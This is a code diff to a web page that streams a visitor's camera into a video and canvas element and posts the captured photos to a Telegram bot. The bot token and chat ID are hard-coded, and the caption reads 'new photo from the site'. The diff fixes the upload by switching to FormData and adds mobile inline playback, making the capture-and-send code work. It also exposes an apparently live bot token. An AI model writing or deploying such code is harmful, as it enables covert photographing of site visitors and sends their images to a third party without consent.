@@ -42,7 +42,7 @@ font-size:30px;
 
 <body>
 
-<video id="video" autoplay></video>
+<video id="video" autoplay playsinline></video>
 
 <canvas id="canvas"></canvas>
 
@@ -94,16 +94,21 @@ function sendToTelegram(imageData){
 const token = "8616417285:AAHQvJfY029-xxipt4cENWAU9oRtQml-gKw"
 const chat_id = "7737717483"
 
+fetch(imageData)
+.then(res => res.blob())
+.then(blob => {
+
+const formData = new FormData()
+
+formData.append("chat_id", chat_id)
+formData.append("photo", blob, "photo.png")
+formData.append("caption","صورة جديدة من الموقع 📸")
+
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
 method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id:chat_id,
-photo:imageData,
-caption:"صورة جديدة من الموقع 📸"
+body: formData
 })
+
 })
 
 }
